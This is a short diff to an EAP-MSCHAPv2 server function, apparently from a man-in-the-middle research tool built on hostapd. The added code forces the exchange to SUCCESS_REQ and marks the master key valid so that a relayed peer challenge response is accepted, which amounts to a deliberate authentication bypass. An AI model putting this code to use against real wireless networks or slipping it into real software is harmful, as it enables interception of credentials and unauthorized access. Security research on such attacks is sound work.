@@ -352,7 +352,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	int res;
 	char *buf;
 
-	enum local_mitm_state {HACK, SKIP, PENDING} lm_state = SKIP;
+	enum local_mitm_state {HACK, HACK2, SKIP, PENDING} lm_state = SKIP;
 	struct instance_data * self = NULL;
 
 	static int k = 10;
@@ -391,7 +391,29 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		}
 
 		if (k > 0 && k < 9) {
-			lm_state = PENDING;
+			switch(self->mitm_protocol_state) {
+			case 0x6:
+				if (self->mitm_data) {
+					data->state = SUCCESS_REQ;
+					data->master_key_valid = 1;
+
+					wpa_printf(MSG_DEBUG,
+						   "MITM: Received packet - "
+						   "hack MSCHAPv2 process "
+						   "response to accept "
+						   "Bob Peer Challenge Response");
+					self->mitm_protocol_state = 0x7;
+					k = -1;
+
+					lm_state = HACK2;
+					break;
+				}
+				lm_state = PENDING;
+				break;
+			default:
+				lm_state = PENDING;
+				break;
+			}
 		}
 
 		if (k == -1)
